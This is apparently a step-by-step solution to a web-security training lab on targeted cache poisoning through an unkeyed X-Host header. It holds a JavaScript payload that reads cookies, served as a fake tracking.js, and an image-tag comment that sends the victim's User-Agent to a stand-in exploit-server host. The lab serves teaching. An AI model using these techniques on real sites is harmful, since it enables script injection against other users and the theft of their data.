Solution Steps:

1. Load the home page with Burp Suite running.
2. In Proxy → HTTP history, find the GET / request.
3. Use Param Miner → Guess headers and identify the hidden header:
   X-Host
4. Send the request to Repeater and add a cache-buster parameter.
5. Add:
   X-Host: example.com
   and verify it controls the URL of:
   /resources/js/tracking.js
6. On the Exploit Server, create:
   /resources/js/tracking.js
7. Add the payload:
   alert(document.cookie)
   and store the exploit.
8. Set:
   X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
9. Send the request until the exploit server URL is reflected and the response contains:
   X-Cache: hit
10. Verify the payload by loading the URL in the browser.
11. Post the following comment:
    <img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
12. Open the Access log on the Exploit Server and wait for the victim request.
13. Copy the victim's User-Agent from the log.
14. In Burp Repeater, paste the victim's User-Agent into the User-Agent header and remove the cache-buster.
15. Keep sending the request until the response reflects your exploit server URL and shows:
    X-Cache: hit
16. Continue replaying the request until the victim visits the poisoned cache and the lab is solved.
